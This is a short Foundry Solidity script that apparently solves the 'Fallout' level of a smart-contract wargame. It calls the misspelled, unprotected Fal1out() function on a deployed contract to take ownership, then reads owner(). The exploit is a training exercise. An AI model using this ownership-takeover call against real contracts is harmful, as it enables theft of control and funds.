// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "@contracts/Level02.sol";

contract Level2Script is Script {
    Fallout level2 = Fallout(0xaCEe5e6f4669430F22E55a8191cDB84E7D698bcA);

    function run() public {
        vm.startBroadcast();

        level2.Fal1out();
        level2.owner();

        vm.stopBroadcast();
    }
}
